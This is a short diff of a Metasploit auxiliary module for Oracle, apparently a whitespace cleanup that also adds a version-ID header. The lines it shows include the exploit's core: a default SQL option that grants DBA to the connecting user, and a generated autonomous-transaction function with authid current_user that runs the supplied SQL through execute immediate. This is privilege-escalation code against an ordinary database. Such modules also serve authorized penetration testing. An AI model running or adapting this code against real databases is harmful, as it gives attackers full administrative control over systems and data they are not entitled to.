@@ -1,4 +1,8 @@
 ##
+# $Id$
+##
+
+##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
@@ -27,23 +31,23 @@ class Metasploit3 < Msf::Auxiliary
 				],
 			'DisclosureDate' => 'Jan 5 2008'))
 
-			register_options( 
+			register_options(
 				[
-					OptString.new('SQL', [ false, 'SQL to execute.',  "GRANT DBA to #{datastore['DBUSER']}"]),					
+					OptString.new('SQL', [ false, 'SQL to execute.',  "GRANT DBA to #{datastore['DBUSER']}"]),
 				], self.class)
 	end
 
 	def run
 		return if not check_dependencies
 
-		name = Rex::Text.rand_text_alpha(rand(10) + 1) 
+		name = Rex::Text.rand_text_alpha(rand(10) + 1)
 
 		function = "
 			create or replace function #{datastore['DBUSER']}.#{name} return varchar2
 			authid current_user is pragma autonomous_transaction;
-			begin 
+			begin
 			execute immediate '#{datastore['SQL']}';
-			return ''; 
+			return '';
 			end;
 			"
 
